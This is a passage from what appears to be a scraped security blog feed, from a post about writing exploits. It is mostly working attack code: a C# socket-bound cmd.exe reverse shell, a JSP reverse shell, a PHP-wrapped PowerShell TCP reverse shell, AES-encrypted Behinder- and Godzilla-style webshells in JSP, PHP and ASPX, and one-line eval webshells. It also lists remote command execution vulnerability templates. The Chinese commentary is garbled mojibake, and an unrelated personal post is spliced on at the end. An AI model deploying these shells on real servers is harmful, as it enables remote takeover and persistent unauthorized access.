pSid, StringBuilder Account, ref int cbName, StringBuilder DomainName, ref int cbDomainName, ref int peUse ); [DllImport(&quot;advapi32&quot;, CharSet = CharSet.Auto)] public extern static bool ConvertSidToStringSid( IntPtr pSID, [In, Out, MarshalAs(UnmanagedType.LPTStr)] ref string pStringSid); [DllImport(&quot;kernel32.dll&quot;, SetLastError = true)] public static extern bool CloseHandle( IntPtr hHandle); [DllImport(&quot;kernel32.dll&quot;, SetLastError = true)] public static extern IntPtr OpenProcess(ProcessAccessFlags dwDesiredAccess, [MarshalAs(UnmanagedType.Bool)] bool bInheritHandle, uint dwProcessId); [Flags] public enum ProcessAccessFlags : uint &#123; All = 0x001F0FFF, Terminate = 0x00000001, CreateThread = 0x00000002, VMOperation = 0x00000008, VMRead = 0x00000010, VMWrite = 0x00000020, DupHandle = 0x00000040, SetInformation = 0x00000200, QueryInformation = 0x00000400, Synchronize = 0x00100000 &#125; [DllImport(&quot;kernel32.dll&quot;)] static extern IntPtr GetCurrentProcess(); [DllImport(&quot;kernel32.dll&quot;)] extern static IntPtr GetCurrentThread(); [DllImport(&quot;kernel32.dll&quot;, SetLastError = true)] [return: MarshalAs(UnmanagedType.Bool)] static extern bool DuplicateHandle(IntPtr hSourceProcessHandle, IntPtr hSourceHandle, IntPtr hTargetProcessHandle, out IntPtr lpTargetHandle, uint dwDesiredAccess, [MarshalAs(UnmanagedType.Bool)] bool bInheritHandle, uint dwOptions); [DllImport(&quot;psapi.dll&quot;, SetLastError = true)] public static extern bool EnumProcessModules(IntPtr hProcess, [MarshalAs(UnmanagedType.LPArray, ArraySubType = UnmanagedType.U4)] [In][Out] uint[] lphModule, uint cb, [MarshalAs(UnmanagedType.U4)] out uint lpcbNeeded); [DllImport(&quot;psapi.dll&quot;)] static extern uint GetModuleBaseName(IntPtr hProcess, uint hModule, StringBuilder lpBaseName, uint nSize); public const uint PIPE_ACCESS_OUTBOUND = 0x00000002; public const uint PIPE_ACCESS_DUPLEX = 0x00000003; public const uint PIPE_ACCESS_INBOUND = 0x00000001; public const uint PIPE_WAIT = 0x00000000; public const uint PIPE_NOWAIT = 0x00000001; public const uint PIPE_READMODE_BYTE = 0x00000000; public const uint PIPE_READMODE_MESSAGE = 0x00000002; public const uint PIPE_TYPE_BYTE = 0x00000000; public const uint PIPE_TYPE_MESSAGE = 0x00000004; public const uint PIPE_CLIENT_END = 0x00000000; public const uint PIPE_SERVER_END = 0x00000001; public const uint PIPE_UNLIMITED_INSTANCES = 255; public const uint NMPWAIT_WAIT_FOREVER = 0xffffffff; public const uint NMPWAIT_NOWAIT = 0x00000001; public const uint NMPWAIT_USE_DEFAULT_WAIT = 0x00000000; public const uint GENERIC_READ = (0x80000000); public const uint GENERIC_WRITE = (0x40000000); public const uint GENERIC_EXECUTE = (0x20000000); public const uint GENERIC_ALL = (0x10000000); public const uint CREATE_NEW = 1; public const uint CREATE_ALWAYS = 2; public const uint OPEN_EXISTING = 3; public const uint OPEN_ALWAYS = 4; public const uint TRUNCATE_EXISTING = 5; public const int INVALID_HANDLE_VALUE = -1; public const ulong ERROR_SUCCESS = 0; public const ulong ERROR_CANNOT_CONNECT_TO_PIPE = 2; public const ulong ERROR_PIPE_BUSY = 231; public const ulong ERROR_NO_DATA = 232; public const ulong ERROR_PIPE_NOT_CONNECTED = 233; public const ulong ERROR_MORE_DATA = 234; public const ulong ERROR_PIPE_CONNECTED = 535; public const ulong ERROR_PIPE_LISTENING = 536; [DllImport(&quot;kernel32.dll&quot;, SetLastError = true)] public static extern IntPtr CreateNamedPipe( String lpName, uint dwOpenMode, uint dwPipeMode, uint nMaxInstances, uint nOutBufferSize, uint nInBufferSize, uint nDefaultTimeOut, IntPtr pipeSecurityDescriptor ); [DllImport(&quot;kernel32.dll&quot;, SetLastError = true)] public static extern bool ConnectNamedPipe( IntPtr hHandle, uint lpOverlapped ); [DllImport(&quot;Advapi32.dll&quot;, SetLastError = true)] public static extern bool ImpersonateNamedPipeClient( IntPtr hHandle); [DllImport(&quot;kernel32.dll&quot;, SetLastError = true)] public static extern bool GetNamedPipeHandleState( IntPtr hHandle, IntPtr lpState, IntPtr lpCurInstances, IntPtr lpMaxCollectionCount, IntPtr lpCollectDataTimeout, StringBuilder lpUserName, int nMaxUserNameSize ); protected void CallbackShell(string server, int port) &#123; string request = &quot;Spawn Shell...\\n&quot;; Byte[] bytesSent = Encoding.ASCII.GetBytes(request); IntPtr oursocket = IntPtr.Zero; sockaddr_in socketinfo; oursocket = WSASocket(AddressFamily.InterNetwork,SocketType.Stream,ProtocolType.IP, IntPtr.Zero, 0, 0); socketinfo = new sockaddr_in(); socketinfo.sin_family = (short) AddressFamily.InterNetwork; socketinfo.sin_addr = inet_addr(server); socketinfo.sin_port = (short) htons((ushort)port); connect(oursocket, ref socketinfo, Marshal.SizeOf(socketinfo)); send(oursocket, bytesSent, request.Length, 0); SpawnProcessAsPriv(oursocket); closesocket(oursocket); &#125; protected void SpawnProcess(IntPtr oursocket) &#123; bool retValue; string Application = Environment.GetEnvironmentVariable(&quot;comspec&quot;); PROCESS_INFORMATION pInfo = new PROCESS_INFORMATION(); STARTUPINFO sInfo = new STARTUPINFO(); SECURITY_ATTRIBUTES pSec = new SECURITY_ATTRIBUTES(); pSec.Length = Marshal.SizeOf(pSec); sInfo.dwFlags = 0x00000101; sInfo.hStdInput = oursocket; sInfo.hStdOutput = oursocket; sInfo.hStdError = oursocket; retValue = CreateProcess(Application, &quot;&quot;, ref pSec, ref pSec, true, 0, IntPtr.Zero, null, ref sInfo, out pInfo); WaitForSingleObject(pInfo.hProcess, (int)INFINITE); &#125; protected void SpawnProcessAsPriv(IntPtr oursocket) &#123; bool retValue; string Application = Environment.GetEnvironmentVariable(&quot;comspec&quot;); PROCESS_INFORMATION pInfo = new PROCESS_INFORMATION(); STARTUPINFO sInfo = new STARTUPINFO(); SECURITY_ATTRIBUTES pSec = new SECURITY_ATTRIBUTES(); pSec.Length = Marshal.SizeOf(pSec); sInfo.dwFlags = 0x00000101; IntPtr DupeToken = new IntPtr(0); sInfo.hStdInput = oursocket; sInfo.hStdOutput = oursocket; sInfo.hStdError = oursocket; if (DupeToken == IntPtr.Zero) retValue = CreateProcess(Application, &quot;&quot;, ref pSec, ref pSec, true, 0, IntPtr.Zero, null, ref sInfo, out pInfo); else retValue = CreateProcessAsUser(DupeToken, Application, &quot;&quot;, ref pSec, ref pSec, true, 0, IntPtr.Zero, null, ref sInfo, out pInfo); WaitForSingleObject(pInfo.hProcess, (int)INFINITE); CloseHandle(DupeToken); &#125; &lt;/script&gt; JSP1&lt;%@page import=&quot;java.lang.*,java.util.*,java.io.*,java.net.*&quot;%&gt;&lt;%class StreamConnector extends Thread&#123;InputStream is;OutputStream os;StreamConnector(InputStream is,OutputStream os)&#123;this.is=is;this.os=os;&#125;public void run()&#123;BufferedReader in=null;BufferedWriter out=null;try&#123;in=new BufferedReader(new InputStreamReader(this.is));out=new BufferedWriter(new OutputStreamWriter(this.os));char buffer[]=new char[8192];int length;while((length=in.read(buffer,0,buffer.length))&gt;0)&#123;out.write(buffer,0,length);out.flush();&#125;&#125;catch(Exception e)&#123;&#125;try&#123;if(in!=null)in.close();if(out!=null)out.close();&#125;catch(Exception e)&#123;&#125;&#125;&#125;try&#123;Socket socket=new Socket(&quot;` + addr + `&quot;,` + rp + `);Process process=Runtime.getRuntime().exec(&quot;cmd.exe&quot;);(new StreamConnector(process.getInputStream(),socket.getOutputStream())).start();(new StreamConnector(socket.getInputStream(),process.getOutputStream())).start();&#125;catch(Exception e)&#123;&#125;%&gt; PHP1phpCode = `system(base64_decode(&quot;` + base64EncodeG73gbY37RF(&quot;powershell -nop -c \\&quot;$client = New-Object System.Net.Sockets.TCPClient(&#x27;&quot;+addr+&quot;&#x27;,&quot;+rp+&quot;);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%&#123;0&#125;;while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0)&#123;;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2&gt;&amp;1 | Out-String );$sendback2 = $sendback + &#x27;PS &#x27; + (pwd).Path + &#x27;&gt; &#x27;;$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()&#125;;$client.Close()\\&quot;&quot;) + `&quot;));` webshell (AES_BASE64)å†°èjspæ”¹äº†å¯¼å…¥çš„ç±» 1&lt;%@page import=&quot;java.util.*,javax.crypto.*,javax.crypto.spec.*,java.nio.charset.StandardCharsets&quot;%&gt;&lt;%!class U extends ClassLoader&#123;U(ClassLoader c)&#123;super(c);&#125;public Class g(byte[] b)&#123;return super.defineClass(null,b,0,b.length);&#125;&#125;%&gt;&lt;%if(request.getMethod().equals(&quot;POST&quot;))&#123;String k=&quot;e45e329feb5d925b&quot;;session.putValue(&quot;u&quot;,k);Cipher c=Cipher.getInstance(&quot;AES&quot;);c.init(Cipher.DECRYPT_MODE,new SecretKeySpec(k.getBytes(StandardCharsets.UTF_8),&quot;AES&quot;));byte[] decodedBytes=Base64.getDecoder().decode(request.getReader().readLine());new U(this.getClass().getClassLoader()).g(c.doFinal(decodedBytes)).newInstance().equals(pageContext);&#125; %&gt; åŸå§‹ 1&lt;%@page import=&quot;java.util.*,javax.crypto.*,javax.crypto.spec.*&quot;%&gt;&lt;%!class U extends ClassLoader&#123;U(ClassLoader c)&#123;super(c);&#125;public Class g(byte []b)&#123;return super.defineClass(b,0,b.length);&#125;&#125;%&gt;&lt;%if (request.getMethod().equals(&quot;POST&quot;))&#123;String k=&quot;e45e329feb5d925b&quot;;session.putValue(&quot;u&quot;,k);Cipher c=Cipher.getInstance(&quot;AES&quot;);c.init(2,new SecretKeySpec(k.getBytes(),&quot;AES&quot;));new U(this.getClass().getClassLoader()).g(c.doFinal(new sun.misc.BASE64Decoder().decodeBuffer(request.getReader().readLine()))).newInstance().equals(pageContext);&#125;%&gt; PHP1&lt;?php @error_reporting(0);session_start();$key=&quot;e45e329feb5d925b&quot;;$_SESSION[&quot;k&quot;]=$key;session_write_close();$post=file_get_contents(&quot;php://input&quot;);if(!extension_loaded(&quot;openssl&quot;))&#123;$t=&quot;base64_&quot;.&quot;decode&quot;;$post=$t($post.&quot;&quot;);for($i=0;$i&lt;strlen($post);$i++)&#123;$post[$i]=$post[$i]^$key[$i+1&amp;15];&#125;&#125;else&#123;$post=openssl_decrypt($post,&quot;AES128&quot;,$key);&#125;$arr=explode(&quot;|&quot;,$post);$func=$arr[0];$params=$arr[1];class C&#123;public function __invoke($p)&#123;eval($p.&quot;&quot;);&#125;&#125;@call_user_func(new C(),$params);?&gt; ASPX1&lt;%@ Page Language=&quot;C#&quot; %&gt;&lt;%@Import Namespace=&quot;System.Reflection&quot;%&gt;&lt;%Session.Add(&quot;k&quot;,&quot;e45e329feb5d925b&quot;);byte[] k = Encoding.Default.GetBytes(Session[0] + &quot;&quot;),c = Request.BinaryRead(Request.ContentLength);Assembly.Load(new System.Security.Cryptography.RijndaelManaged().CreateDecryptor(k, k).TransformFinalBlock(c, 0, c.Length)).CreateInstance(&quot;U&quot;).Equals(this); %&gt; å“¥æ–¯æ‹‰ASPXåŸå§‹çš„é©¬é‡è§çš„é—®é¢˜æ˜¯ï¼šæœåŠ¡å™¨æ­£å¸¸ä¸Šä¼ ï¼Œæ­£å¸¸è§£æ200ï¼Œä½†æ˜¯é“¾æ¥å¤±è´¥ æŒä¹…åŒ–é—®é¢˜ï¼Œå°† session æ”¹æˆ Application 12345678910111213141516171819202122232425262728293031323334353637383940414243444546&lt;%@ Page Language=&quot;C#&quot;%&gt;&lt;%try &#123; string key = &quot;3c6e0b8a9c15224a&quot;; string pass = &quot;pass&quot;; string md5 = System.BitConverter.ToString(new System.Security.Cryptography.MD5CryptoServiceProvider().ComputeHash(System.Text.Encoding.Default.GetBytes(pass + key))).Replace(&quot;-&quot;, &quot;&quot;); byte[] data = System.Convert.FromBase64String(Context.Request[pass]); data = new System.Security.Cryptography.RijndaelManaged().CreateDecryptor(System.Text.Encoding.Default.GetBytes(key), System.Text.Encoding.Default.GetBytes(key)).TransformFinalBlock(data, 0, data.Length); if (Application[&quot;payload&quot;] == null) &#123; Application[&quot;payload&quot;] = (System.Reflection.Assembly)typeof(System.Reflection.Assembly).GetMethod(&quot;Load&quot;, new System.Type[] &#123; typeof(byte[]) &#125;).Invoke(null, new object[] &#123; data &#125;); &#125; else &#123; System.IO.MemoryStream outStream = new System.IO.MemoryStream(); object o = ((System.Reflection.Assembly)Application[&quot;payload&quot;]).CreateInstance(&quot;LY&quot;); o.Equals(Context); o.Equals(outStream); o.Equals(data); o.ToString(); byte[] r = outStream.ToArray(); Context.Response.Write(md5.Substring(0, 16)); Context.Response.Write(System.Convert.ToBase64String(new System.Security.Cryptography.RijndaelManaged().CreateEncryptor(System.Text.Encoding.Default.GetBytes(key), System.Text.Encoding.Default.GetBytes(key)).TransformFinalBlock(r, 0, r.Length))); Context.Response.Write(md5.Substring(16)); &#125; &#125; catch (System.Exception) &#123; &#125;%&gt;------------------------------------------------------------------æ˜“è¯»ç‰ˆæœ¬ ------------------------------------------------------------------&lt;%@ Page Language=&quot;C#&quot; %&gt;&lt;%try&#123; string key = &quot;3c6e0b8a9c15224a&quot;; string pass = &quot;pass&quot;; string md5 = System.BitConverter.ToString(new System.Security.Cryptography.MD5CryptoServiceProvider().ComputeHash(System.Text.Encoding.Default.GetBytes(pass + key))).Replace(&quot;-&quot;, &quot;&quot;); byte[] data = System.Convert.FromBase64String(Context.Request[pass]); data = new System.Security.Cryptography.RijndaelManaged().CreateDecryptor(System.Text.Encoding.Default.GetBytes(key), System.Text.Encoding.Default.GetBytes(key)).TransformFinalBlock(data, 0, data.Length); if (Application[&quot;payload&quot;] == null) &#123; Application[&quot;payload&quot;] = (System.Reflection.Assembly)typeof(System.Reflection.Assembly).GetMethod(&quot;Load&quot;, new System.Type[] &#123; typeof(byte[]) &#125;).Invoke(null, new object[] &#123; data &#125;); &#125; else &#123; System.IO.MemoryStream outStream = new System.IO.MemoryStream(); object o = ((System.Reflection.Assembly)Application[&quot;payload&quot;]).CreateInstance(&quot;LY&quot;); o.Equals(Context); o.Equals(outStream); o.Equals(data); o.ToString(); byte[] r = outStream.ToArray(); Context.Response.Write(md5.Substring(0, 16)); Context.Response.Write(System.Convert.ToBase64String(new System.Security.Cryptography.RijndaelManaged().CreateEncryptor(System.Text.Encoding.Default.GetBytes(key), System.Text.Encoding.Default.GetBytes(key)).TransformFinalBlock(r, 0, r.Length))); Context.Response.Write(md5.Substring(16)); &#125;&#125;catch (System.Exception)&#123;&#125;%&gt; åœ¨C#ä¸­ï¼ŒSessionå’ŒApplicationéƒ½æ˜¯ASP.NETä¸­çš„å¯¹è±¡ï¼Œç”¨äºåœ¨Webåº”ç”¨ç¨‹åºä¸­å­˜å‚¨å’Œå…±äº«æ•°æ®ï¼Œä½†å®ƒä»¬çš„ä½¿ç”¨æ–¹å¼å’Œä½œç”¨æœ‰æ‰€ä¸åŒã€‚ Session: Sessionå¯¹è±¡ç”¨äºåœ¨ç”¨æˆ·ä¼šè¯ä¹‹é—´å­˜å‚¨å’Œæ£€ç´¢æ•°æ®ã€‚æ¯ä¸ªç”¨æˆ·åœ¨è®¿é—®åº”ç”¨ç¨‹åºæ—¶éƒ½æœ‰ä¸€ä¸ªå”¯ä¸€çš„ä¼šè¯IDï¼Œè€ŒSessionå¯¹è±¡å…è®¸æ‚¨åœ¨ç”¨æˆ·çš„æ•´ä¸ªä¼šè¯æœŸé—´å­˜å‚¨å’Œæ£€ç´¢ç‰¹å®šäºè¯¥ç”¨æˆ·çš„æ•°æ®ã€‚ Sessioné€šå¸¸ç”¨äºå­˜å‚¨ç”¨æˆ·ç‰¹å®šçš„ä¿¡æ¯ï¼Œä¾‹å¦‚ç™»å½•çŠ¶æ€ã€è´­ç‰©è½¦å†…å®¹ç­‰ã€‚ é€šè¿‡HttpContext.Current.Sessionå¯ä»¥è®¿é—®Sessionå¯¹è±¡ã€‚ ç¤ºä¾‹ï¼š 123456csharpCopy code// å­˜å‚¨æ•°æ®åˆ°SessionHttpContext.Current.Session[&quot;UserName&quot;] = &quot;JohnDoe&quot;;// ä»Sessionä¸­æ£€ç´¢æ•°æ®string userName = (string)HttpContext.Current.Session[&quot;UserName&quot;]; Application: Applicationå¯¹è±¡ç”¨äºåœ¨æ•´ä¸ªåº”ç”¨ç¨‹åºåŸŸï¼ˆApplication Domainï¼‰ä¸­å­˜å‚¨å’Œæ£€ç´¢æ•°æ®ã€‚åº”ç”¨ç¨‹åºåŸŸæ˜¯ä¸€ä¸ªéš”ç¦»çš„æ‰§è¡Œç¯å¢ƒï¼Œå¯¹äºæ•´ä¸ªåº”ç”¨ç¨‹åºåªæœ‰ä¸€ä¸ªå®ä¾‹ã€‚ Applicationå¯¹è±¡çš„æ•°æ®åœ¨æ‰€æœ‰ç”¨æˆ·ä¹‹é—´å…±äº«ï¼Œå› æ­¤éœ€è¦å°å¿ƒä½¿ç”¨ï¼Œä»¥é¿å…å¹¶å‘é—®é¢˜å’Œç«æ€æ¡ä»¶ã€‚ Applicationé€šå¸¸ç”¨äºå­˜å‚¨å…¨å±€é…ç½®ä¿¡æ¯ã€è®¡æ•°å™¨ç­‰å¯¹æ•´ä¸ªåº”ç”¨ç¨‹åºæœ‰æ„ä¹‰çš„æ•°æ®ã€‚ ç¤ºä¾‹ï¼š 123456csharpCopy code// å­˜å‚¨æ•°æ®åˆ°ApplicationApplication[&quot;TotalVisitors&quot;] = 1000;// ä»Applicationä¸­æ£€ç´¢æ•°æ®int totalVisitors = (int)Application[&quot;TotalVisitors&quot;]; æ€»çš„æ¥è¯´ï¼ŒSessionç”¨äºåœ¨ç”¨æˆ·ä¼šè¯ä¹‹é—´å­˜å‚¨å’Œæ£€ç´¢æ•°æ®ï¼Œè€ŒApplicationç”¨äºåœ¨æ•´ä¸ªåº”ç”¨ç¨‹åºä¸­å­˜å‚¨å’Œæ£€ç´¢æ•°æ®ã€‚åœ¨ä½¿ç”¨å®ƒä»¬æ—¶ï¼Œè¦è€ƒè™‘åˆ°æ•°æ®çš„èŒƒå›´å’Œå…±äº«çš„éœ€æ±‚ï¼Œä»¥ç¡®ä¿å®‰å…¨å’Œæœ‰æ•ˆåœ°ç®¡ç†æ•°æ®ã€‚ Sessionå’ŒApplicationä¸æŒä¹…åŒ–çš„å…³ç³»ä¸»è¦ä½“ç°åœ¨å®ƒä»¬çš„ç”Ÿå‘½å‘¨æœŸå’Œæ•°æ®ä¿å­˜çš„æŒä¹…æ€§æ–¹é¢ã€‚ Session: Sessionå¯¹è±¡é€šå¸¸å­˜å‚¨åœ¨æœåŠ¡å™¨çš„å†…å­˜ä¸­ï¼Œå®ƒçš„ç”Ÿå‘½å‘¨æœŸä¸ç”¨æˆ·çš„ä¼šè¯æœŸé—´ç›¸åŒã€‚å½“ç”¨æˆ·å…³é—­æµè§ˆå™¨æˆ–ä¼šè¯è¿‡æœŸæ—¶ï¼ŒSessionæ•°æ®é€šå¸¸è¢«é”€æ¯ã€‚ å¦‚æœéœ€è¦åœ¨ä¼šè¯ä¹‹é—´ä¿æŒSessionæ•°æ®çš„çŠ¶æ€ï¼Œå¯ä»¥é€‰æ‹©ä½¿ç”¨æŸç§å½¢å¼çš„æŒä¹…åŒ–æœºåˆ¶ï¼Œå¦‚å°†Sessionæ•°æ®å­˜å‚¨åœ¨æ•°æ®åº“ä¸­æˆ–ä½¿ç”¨å…¶ä»–å¤–éƒ¨å­˜å‚¨ã€‚ Application: Applicationå¯¹è±¡çš„æ•°æ®ä¹Ÿå­˜å‚¨åœ¨æœåŠ¡å™¨çš„å†…å­˜ä¸­ï¼Œä½†å…¶ç”Ÿå‘½å‘¨æœŸæ›´é•¿ï¼Œä¸åº”ç”¨ç¨‹åºåŸŸçš„ç”Ÿå‘½å‘¨æœŸç›¸åŒã€‚å®ƒåœ¨åº”ç”¨ç¨‹åºå¯åŠ¨æ—¶è¢«åˆ›å»ºï¼Œåœ¨åº”ç”¨ç¨‹åºå…³é—­æ—¶è¢«é”€æ¯ã€‚ ä¸Sessionä¸åŒï¼ŒApplicationæ•°æ®çš„æŒä¹…æ€§æ›´é«˜ï¼Œä½†ä»ç„¶æ˜¯é™å®šåœ¨åº”ç”¨ç¨‹åºåŸŸçš„ç”Ÿå‘½å‘¨æœŸå†…çš„ï¼Œä¸ä¼šè·¨è¶Šå¤šä¸ªåº”ç”¨ç¨‹åºåŸŸã€‚ åœ¨éœ€è¦æ›´é•¿æ—¶é—´ä¿ç•™æ•°æ®çš„æƒ…å†µä¸‹ï¼Œå¯ä»¥è€ƒè™‘ä½¿ç”¨æ›´æŒä¹…çš„å­˜å‚¨æœºåˆ¶ï¼Œä¾‹å¦‚æ•°æ®åº“ã€æ–‡ä»¶ç³»ç»Ÿç­‰ã€‚è¿™ç¡®ä¿äº†æ•°æ®åœ¨åº”ç”¨ç¨‹åºé‡æ–°å¯åŠ¨æ—¶ä»ç„¶å¯ç”¨ã€‚ æ€»ä½“è€Œè¨€ï¼ŒSessionå’ŒApplicationå¯¹è±¡æœ¬èº«åœ¨å†…å­˜ä¸­å­˜å‚¨æ•°æ®ï¼Œä½†å¼€å‘äººå‘˜éœ€è¦æ ¹æ®å…·ä½“éœ€æ±‚å†³å®šæ˜¯å¦éœ€è¦ä½¿ç”¨æŒä¹…åŒ–æœºåˆ¶æ¥ç¡®ä¿æ•°æ®çš„é•¿æœŸå­˜å‚¨å’Œå¯è®¿é—®æ€§ã€‚ 1&lt;%@ Page Language=\\&quot;C#\\&quot; %&gt;&lt;%= \\&quot;Hello, World!\\&quot; %&gt; 1&lt;%@ Page Language=\\&quot;C#\\&quot;%&gt;&lt;%@ Import Namespace=\\&quot;System.IO\\&quot;%&gt;&lt;% Response.Write(\\&quot;hello\\&quot;); %&gt; PHP1&lt;?php @session_start(); @set_time_limit(0); @error_reporting(0); function encode($D,$K)&#123; for($i=0;$i&lt;strlen($D);$i++) &#123; $c = $K[$i+1&amp;15]; $D[$i] = $D[$i]^$c; &#125; return $D; &#125; $pass=&quot;pass&quot;; $payloadName=&quot;payload&quot;; $key=&quot;3c6e0b8a9c15224a&quot;; if (isset($_POST[$pass]))&#123; $data=encode(base64_decode($_POST[$pass]),$key); if (isset($_SESSION[$payloadName]))&#123; $payload=encode($_SESSION[$payloadName],$key); if (strpos($payload,&quot;getBasicsInfo&quot;)===false)&#123; $payload=encode($payload,$key); &#125; eval($payload); echo substr(md5($pass.$key),0,16); echo base64_encode(encode(@run($data),$key)); echo substr(md5($pass.$key),16); &#125;else&#123; if (strpos($data,&quot;getBasicsInfo&quot;)!==false)&#123; $_SESSION[$payloadName]=encode($data,$key);&#125;&#125;&#125;?&gt; 1&lt;?php echo &quot;hello&quot;; ?&gt; JSP1&lt;%! String xc=&quot;3c6e0b8a9c15224a&quot;; String pass=&quot;pass&quot;; String md5=md5(pass+xc); class X extends ClassLoader&#123;public X(ClassLoader z)&#123;super(z);&#125;public Class Q(byte[] cb)&#123;return super.defineClass(cb, 0, cb.length);&#125; &#125;public byte[] x(byte[] s,boolean m)&#123; try&#123;javax.crypto.Cipher c=javax.crypto.Cipher.getInstance(&quot;AES&quot;);c.init(m?1:2,new javax.crypto.spec.SecretKeySpec(xc.getBytes(),&quot;AES&quot;));return c.doFinal(s); &#125;catch (Exception e)&#123;return null; &#125;&#125; public static String md5(String s) &#123;String ret = null;try &#123;java.security.MessageDigest m;m = java.security.MessageDigest.getInstance(&quot;MD5&quot;);m.update(s.getBytes(), 0, s.length());ret = new java.math.BigInteger(1, m.digest()).toString(16).toUpperCase();&#125; catch (Exception e) &#123;&#125;return ret; &#125; public static String base64Encode(byte[] bs) throws Exception &#123;Class base64;String value = null;try &#123;base64=Class.forName(&quot;java.util.Base64&quot;);Object Encoder = base64.getMethod(&quot;getEncoder&quot;, null).invoke(base64, null);value = (String)Encoder.getClass().getMethod(&quot;encodeToString&quot;, new Class[] &#123; byte[].class &#125;).invoke(Encoder, new Object[] &#123; bs &#125;);&#125; catch (Exception e) &#123;try &#123; base64=Class.forName(&quot;sun.misc.BASE64Encoder&quot;); Object Encoder = base64.newInstance(); value = (String)Encoder.getClass().getMethod(&quot;encode&quot;, new Class[] &#123; byte[].class &#125;).invoke(Encoder, new Object[] &#123; bs &#125;);&#125; catch (Exception e2) &#123;&#125;&#125;return value; &#125; public static byte[] base64Decode(String bs) throws Exception &#123;Class base64;byte[] value = null;try &#123;base64=Class.forName(&quot;java.util.Base64&quot;);Object decoder = base64.getMethod(&quot;getDecoder&quot;, null).invoke(base64, null);value = (byte[])decoder.getClass().getMethod(&quot;decode&quot;, new Class[] &#123; String.class &#125;).invoke(decoder, new Object[] &#123; bs &#125;);&#125; catch (Exception e) &#123;try &#123; base64=Class.forName(&quot;sun.misc.BASE64Decoder&quot;); Object decoder = base64.newInstance(); value = (byte[])decoder.getClass().getMethod(&quot;decodeBuffer&quot;, new Class[] &#123; String.class &#125;).invoke(decoder, new Object[] &#123; bs &#125;);&#125; catch (Exception e2) &#123;&#125;&#125;return value; &#125;%&gt;&lt;%try&#123;byte[] data=base64Decode(request.getParameter(pass));data=x(data, false);if (session.getAttribute(&quot;payload&quot;)==null)&#123;session.setAttribute(&quot;payload&quot;,new X(this.getClass().getClassLoader()).Q(data));&#125;else&#123;request.setAttribute(&quot;parameters&quot;,data);java.io.ByteArrayOutputStream arrOut=new java.io.ByteArrayOutputStream();Object f=((Class)session.getAttribute(&quot;payload&quot;)).newInstance();f.equals(arrOut);f.equals(pageContext);response.getWriter().write(md5.substring(0,16));f.toString();response.getWriter().write(base64Encode(x(arrOut.toByteArray(), true)));response.getWriter().write(md5.substring(16));&#125; &#125;catch (Exception e)&#123;&#125;%&gt; 1&lt;% out.println(&quot;hello&quot;);%&gt; èšå‰‘ASPX1&lt;%@ Page Language=&quot;Jscript&quot;%&gt; &lt;%eval(Request.Item[&quot;pass&quot;],&quot;unsafe&quot;);%&gt; PHP1&lt;?php eval($_POST[&#x27;pass&#x27;]); ?&gt; JSP1&lt;% Runtime.getRuntime().exec(request.getParameter(&quot;pass&quot;));%&gt; æ¼æ´æ¨¡ç‰ˆPHPIP-guard WebServer view.php è¿œç¨‹å‘½ä»¤æ‰§è¡Œæ¼æ´ IP-guard WebServer view.php remote command execution vulnerability CVD-2023-3208 ASPXMicrosoft Exchange Server Remote Command Execution Vulnerability (CVE-2021-26857&#x2F;CVE-2021-26858) Microsoft Exchange Server è¿œç¨‹å‘½ä»¤æ‰§è¡Œæ¼æ´ï¼ˆCVE-2021-26857&#x2F;CVE-2021-26858ï¼‰ CVD-2023-0787 JSPI Doc View cmd.json remote command execution vulnerability I Doc View cmd.json è¿œç¨‹å‘½ä»¤æ‰§è¡Œæ¼æ´ CVD-2023-3273","categories":[{"name":"å†™ exp é‡åˆ°çš„é—®é¢˜","slug":"å†™-exp-é‡åˆ°çš„é—®é¢˜","permalink":"https://gryffinbit.top/categories/%E5%86%99-exp-%E9%81%87%E5%88%B0%E7%9A%84%E9%97%AE%E9%A2%98/"}],"tags":[{"name":"åå¼¹ shell","slug":"åå¼¹-shell","permalink":"https://gryffinbit.top/tags/%E5%8F%8D%E5%BC%B9-shell/"}],"author":"Gryffinbit"},{"title":"2023ä¸‹åŠå¹´å·¥ä½œå¿ƒè·¯å†ç¨‹","slug":"2023ä¸‹åŠå¹´å·¥ä½œå¿ƒè·¯å†ç¨‹","date":"2023-10-20T14:36:46.000Z","updated":"2024-08-27T02:28:08.000Z","comments":true,"path":"2023/10/20/2023ä¸‹åŠå¹´å·¥ä½œå¿ƒè·¯å†ç¨‹/","permalink":"https://gryffinbit.top/2023/10/20/2023%E4%B8%8B%E5%8D%8A%E5%B9%B4%E5%B7%A5%E4%BD%9C%E5%BF%83%E8%B7%AF%E5%8E%86%E7%A8%8B/","excerpt":"","text":"è¿‘æœŸæƒ…ç»ªæ€è€ƒå’Œæ¥ä¸‹æ¥çš„è§£å†³æ–¹æ¡ˆæ§åˆ¶æƒ…ç»ªï¼Œå°½é‡ä¸è¦å¤±æ§çš„å‘è„¾æ°”çœŸå®æ„Ÿå—è¿‘æœŸçš„æ„Ÿå—ï¼šç‰¹åˆ«è¾›è‹¦ï¼Œå¾ˆä¸å¼€å¿ƒã€‚å®Œå…¨å¤±å»äº†ç”Ÿæ´»å’Œæ€è€ƒçš„æ—¶é—´å’Œç©ºé—´ï¼Œæ„Ÿè§‰ç”Ÿæ´»é‡Œéƒ½æ˜¯åŒäº‹å’Œå·¥ä½œï¼Œå¾ˆçª’æ¯ã€‚èŠ‚å¥å¾ˆå¿«ï¼Œå‹åŠ›å¾ˆå¤§ã€‚ å·¥ä½œäººå‘˜å˜åŠ¨ä¹Ÿå¾ˆå¤§ï¼Œéƒ½æ˜¯æµæ°´çš„å®ä¹ ç”Ÿï¼Œå¤§å®¶æœå¤•ç›¸å¤„äº†å¾ˆé•¿ä¸€æ®µæ—¶é—´ï¼Œå¾ˆå¿«åˆé¢ä¸´åˆ†åˆ«ã€‚ä»–ä»¬éƒ½æ˜¯ä¸€ç¾¤çœŸæŒšã€çƒ­æƒ…ã€å–„è‰¯çš„äººã€‚é¢ä¸´åˆ†ç¦»ï¼Œæˆ‘è¿˜æ˜¯ä¸ä¼šå¾ˆå¥½çš„å¤„ç†è‡ªå·±çš„æƒ…ç»ªã€‚ 